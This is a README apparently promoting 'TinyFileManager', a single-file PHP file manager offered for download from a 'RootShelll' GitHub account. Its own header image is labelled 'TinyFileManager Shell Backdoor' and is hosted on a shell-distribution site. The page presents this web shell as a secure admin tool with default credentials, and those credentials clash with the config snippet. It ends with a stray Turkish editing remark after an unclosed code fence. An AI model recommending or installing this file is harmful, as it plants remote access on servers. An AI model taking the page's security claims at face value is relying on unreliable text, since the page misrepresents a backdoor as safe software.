# TinyFileManager: Single-File PHP File Manager For Your Web Projects

![TinyFileManager Shell Backdoor](https://r00t-shell.com/wp-content/uploads/2025/03/screenshot.gif "TinyFileManager Shell Backdoor")

## Description
TinyFileManager is a lightweight, single-file PHP file manager solution for your websites and applications. Easy setup, powerful features, and secure file management.

## Credentials (Default Login)
Use the following credentials for login:

- **UserName**: `admin`
- **Password**: `R00t`

> ⚠️ **Important:** Change the default username and password immediately after installation for security purposes.

---

## What Is TinyFileManager? 🤔

TinyFileManager is a single-file PHP application that provides a complete web-based file management interface for your server. Think of it as having an explorer/finder that works in your browser, giving you the ability to upload, download, edit, delete, and organize files directly through a clean web interface.

---

## Key Features ✨
- 📁 **Complete File Operations** - Upload, delete, copy, move, rename, archive
- 📝 **Built-in Editor** - Edit text files with syntax highlighting
- 🔍 **File Viewer** - Preview images, videos, audio files, and documents
- 🔒 **Authentication System** - Multiple user accounts with different access levels
- 📱 **Responsive Design** - Works on desktop and mobile devices
- 🌐 **Multi-language Support** - Over 15 languages available
- 🎨 **Multiple Themes** - Light and dark mode included
- ⚡ **Lightweight** - Single file, less than 500KB in size
- 🛡️ **Secure** - Password protection and customizable access control

---

## Why Choose TinyFileManager? 🌟
TinyFileManager is ideal for developers, website administrators, or anyone looking for an easy-to-deploy, feature-rich file management solution.

### 🚀 Simple Deployment
Just copy one PHP file to your server and you're ready to go.

### 💼 No Database Required
Works without any database, making installation even easier.

### 🛠️ Developer Friendly
Perfect for developers who need quick access to server files.

### 📊 Resource Efficient
Minimal server resource usage compared to full CMS solutions.

---

## Installation Guide 📥

Getting started with TinyFileManager is incredibly easy:

### Method 1: Direct Download
1. Download the `tinyfilemanager.php` file from [GitHub](https://github.com/RootShelll/TinyFilemanager).
2. Upload it to your web server.
3. Access it through your browser (`e.g., https://your-website.com/tinyfilemanager.php`).
4. Login with default credentials:  
   **UserName:** `admin`  
   **Password:** `R00t`

### Method 2: Using Composer
```bash
composer require RootShelll/TinyFilemanager
```

> ⚠️ **Important Security Note:** Make sure to change the default username and password immediately after installation!

---

## Configuration Options ⚙️

TinyFileManager is highly customizable. Here are some key configuration options you can modify at the top of the PHP file:

```php
// Main settings
$root_path = $_SERVER['DOCUMENT_ROOT'];
$root_url = '';
$http_host = $_SERVER['HTTP_HOST'];

// Authentication credentials
$auth_users = array(
    'admin' => password_hash('R00t@123', PASSWORD_DEFAULT),
    'user' => password_hash('R00t', PASSWORD_DEFAULT)
);

// User roles
$readonly_users = array('user');
$directories_users = array();
```

### Customizable Aspects:
- 🔐 User credentials and access levels
- 📁 Root directory path
- 🌐 Language settings
- 🎨 Theme preferences
- 📋 Allowed operations (upload, delete, etc.)
- 📊 Maximum upload size
- 🛡️ Security settings

---

## Practical Usage Examples 🔍

### Use Case 1: Web Development Environment
- Quickly upload and edit files on your development server
- Test file upload functionality in your applications
- Manage content files without FTP access
- Troubleshoot file-related issues directly from the browser

### Use Case 2: Simple Client File Management
- Provide a restricted file manager for content updates
- Allow clients to upload images and documents
- Create a user-friendly interface for managing website assets
- Enable secure file sharing within an organization

💡 **Pro Tip:** You can integrate TinyFileManager with existing applications by customizing the authentication system to use your application's user database.

---

## Advanced Features 🔥

### File Operations
- **File Upload:** Drag-and-drop file uploads with progress indicators
- **Archive Handling:** Create, extract, and manage ZIP archives
- **File Editing:** Built-in code editor with syntax highlighting
- **Image Manipulation:** Preview and basic editing capabilities
- **Search Functionality:** Find files and folders quickly

### Security Features
- **Authentication:** Password protection with multiple user levels
- **File Type Restrictions:** Control what file types can be uploaded
- **Path Traversal Protection:** Prevents unauthorized directory access
- **Activity Logging:** Track file operations for security auditing
- **CSRF Protection:** Built-in protection against cross-site request forgery

---

## Frequently Asked Questions ❓

### Is TinyFileManager free to use?
Yes, TinyFileManager is completely open-source and free to use under the MIT License.

### Can I use TinyFileManager on shared hosting?
Absolutely! TinyFileManager is designed to work on virtually any hosting environment that supports PHP.

### Does it work with PHP 8?
Yes, TinyFileManager is compatible with PHP 5.5+ through PHP 8.x.

### How do I restrict access to certain directories?
You can configure user roles and permissions in the configuration section to restrict access to specific directories for different users.

### Can I integrate TinyFileManager with my existing application?
Yes, since it's a single PHP file, you can easily integrate it with existing applications by customizing the authentication mechanism.

---

## Screenshots 📸

TinyFileManager features a clean, responsive interface with multiple themes:
- 📱 Mobile-friendly design
- 🌗 Light and dark themes
- 🧩 Intuitive file management interface
- 📝 Built-in code editor

Visit the [GitHub repository](https://github.com/RootShelll/TinyFilemanager) to see screenshots of the interface.

---

## Community and Support 👥

TinyFileManager is actively maintained by its developer community:
- 🐛 **Bug Reports:** Submit issues via [GitHub Issues](https://github.com/RootShelll/TinyFilemanager/issues)
- 💬 **Feature Requests:** Share your ideas for improvements
- 🤝 **Contributions:** Pull requests are welcome
- 📚 **Documentation:** Available in the repository README

🌐 **Community Tip:** Check the GitHub repository's existing issues before reporting a new one to avoid duplicates.

---

## Conclusion 🎉

TinyFileManager offers a perfect balance of simplicity and functionality for web-based file management. With its single-file architecture, robust security features, and intuitive interface, it's an excellent solution for developers, website administrators, and anyone needing easy file management capabilities on their web server.

Whether you're managing a small personal website or need a lightweight file management solution for client projects, TinyFileManager provides a hassle-free way to handle files through your browser.

### Ready to simplify your file management?
Get started with TinyFileManager today:
[Download TinyFileManager on GitHub](https://github.com/RootShelll/TinyFilemanager)
```

Bu şekilde, şifre ve kullanıcı adları belirgin bir şekilde sunulmuş ve kopyalanabilir formatta olacak şekilde düzenlendi.
